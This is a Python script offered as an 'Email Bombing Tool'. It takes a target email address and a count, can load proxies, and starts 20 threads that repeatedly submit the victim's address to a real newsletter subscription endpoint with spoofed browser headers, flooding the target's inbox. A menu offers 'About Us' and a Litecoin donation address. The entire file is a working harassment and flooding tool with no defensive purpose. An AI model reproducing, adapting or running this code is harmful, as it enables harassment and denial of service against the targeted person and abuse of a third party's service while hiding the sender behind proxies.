import requests
import time
import ctypes
from colorama import init, Fore, Style
import os
from pyfiglet import Figlet
import tkinter as tk
from tkinter import filedialog
import threading

init(autoreset=True)

def start_bombing():
    os.system("cls") 
    display_title("Email Bombing Tool # made by @hush1337")

    user_email = input(f"{Fore.YELLOW}[+] Enter the target email: {Style.RESET_ALL}")

    load_proxies = input(f"{Fore.YELLOW}[+] Do you want to load proxies from a file? (y/n): {Style.RESET_ALL}")

    proxies = None

    if load_proxies.lower() == "y":
        root = tk.Tk()
        root.withdraw()
        file_path = filedialog.askopenfilename(title="Select a Proxy File", filetypes=[("Text Files", "*.txt")])

        with open(file_path, 'r') as file:
            proxy_list = file.read().splitlines()

        proxies = {f'http{index+1}': proxy for index, proxy in enumerate(proxy_list)}

    email_bomb_count = int(input(f"{Fore.YELLOW}[+] Enter the number of emails to bomb: {Style.RESET_ALL}"))

    sleep_time = int(input(f"{Fore.YELLOW}[+] Enter the sleep time between requests (in seconds): {Style.RESET_ALL}"))

    url = "https://artisan.cointelegraph.com/v1/maillist/subscribe/"

    headers = {
        "Host": "artisan.cointelegraph.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        "Accept": "application.json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://cointelegraph.com",
        "Connection": "keep-alive",
        "Referer": "https://cointelegraph.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "TE": "trailers"
    }

    successful_bombs = 0 
    lock = threading.Lock()

    def send_request():
        nonlocal successful_bombs
        nonlocal email_bomb_count

        while email_bomb_count > 0:
            data = {
                "email": user_email,
                "list": ["63518551307192135", "63518563605939751"]
            }

            response = requests.post(url, json=data, headers=headers, proxies=proxies)

            with lock:
                email_bomb_count -= 1

                if response.status_code == 200 and "success" in response.text.lower():
                    successful_bombs += 1
                    print(f"{Fore.GREEN}[+] Email Bombed {successful_bombs} times successfully.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[+] Email Bombing failed.{Style.RESET_ALL}")

            time.sleep(sleep_time)

    threads = []
    for _ in range(20):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    ctypes.windll.kernel32.SetConsoleTitleW("[+] Email Bombing Completed")
    print(f"{Fore.CYAN}{Style.BRIGHT}[+] Total successful email bombings: {successful_bombs}/{successful_bombs}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Returning to the main menu in 5 seconds...{Style.RESET_ALL}")
    time.sleep(5)

def about_us():
    os.system("cls") 
    display_title("About Us")
    print("Made By ~ @hush1337 For The Community <3")
    input("[+] Press Enter to return to the main menu.")

def donate():
    os.system("cls")
    display_title("Donate")
    print("LTC - ltc1qt07hufzly6rsgy5ka3n3f05fyyctddvjsp2k7c")
    input("[+] Press Enter to return to the main menu.")

def display_title(title_text):
    f = Figlet(font='slant')
    title = f.renderText(title_text)
    title_lines = title.split('\n')
    max_width = len(title_lines[0])

    for line in title_lines:
        print(f"{Fore.CYAN}{Style.BRIGHT}{line.center(max_width)}{Style.RESET_ALL}")

def display_subtitle(subtitle_text):
    f = Figlet(font='small')
    subtitle = f.renderText(subtitle_text)
    subtitle_lines = subtitle.split('\n')
    max_width = len(subtitle_lines[0])

    for line in subtitle_lines:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}{line.center(max_width)}{Style.RESET_ALL}")

while True:
    os.system("cls")
    display_title("Main Menu")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}")
    print("=" * 80)
    print(f"{Fore.CYAN}1. Start Bombing")
    print(f"{Fore.CYAN}2. About Us")
    print(f"{Fore.CYAN}3. Donate")
    print(f"{Fore.CYAN}4. Exit")
    print("=" * 80)
    print(Style.RESET_ALL)
    choice = input(f"{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")

    if choice == "1":
        start_bombing()
    elif choice == "2":
        about_us()
    elif choice == "3":
        donate()
    elif choice == "4":
        break
    else:
        print(f"{Fore.RED}[+] Invalid choice. Please enter a valid option.{Style.RESET_ALL}")